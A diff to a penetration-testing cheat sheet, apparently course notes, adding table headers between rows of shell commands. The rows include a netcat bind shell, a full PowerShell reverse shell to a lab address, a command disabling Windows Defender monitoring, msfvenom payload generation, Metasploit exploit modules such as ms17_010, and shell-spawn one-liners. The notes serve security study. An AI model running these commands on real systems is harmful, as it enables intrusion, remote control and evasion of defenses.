@@ -23,6 +23,9 @@ tags:
 | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell `(/bin/bash)` the specified IPaddress and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on. |
 | `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box. |
 | `Set-MpPreference -DisableRealtimeMonitoring $true` | Powershell command using to disable real time monitoring in `Windows Defender`. |
+
+|**Command**|**Description**|
+|-|-|
 | `use exploit/windows/smb/psexec ` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`. |
 | `shell` | Command used in a meterpreter shell session to drop into a `system shell`. |
 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`. |
@@ -34,6 +37,9 @@ tags:
 | `use auxiliary/scanner/smb/smb_ms17_010` | Metasploit exploit module used to check if a host is vulnerable to `ms17_010`. |
 | `use exploit/windows/smb/ms17_010_psexec` | Metasploit exploit module used to gain a reverse shell session on a Windows- based system that is vulnerable to ms17_010. |
 | `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` | Metasploit exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting `rConfig 3.9.6`. |
+
+|**Command**|**Description**|
+|-|-|
 | `python -c 'import pty; pty.spawn("/bin/sh")'` | Python command used to spawn an `interactive shell` on a linux-based system. |
 | `/bin/sh -i` | Spawns an interactive shell on a linux-based system. |
 | `perl —e 'exec "/bin/sh";'` | Uses `perl` to spawn an interactive shell on a linux-based system. |
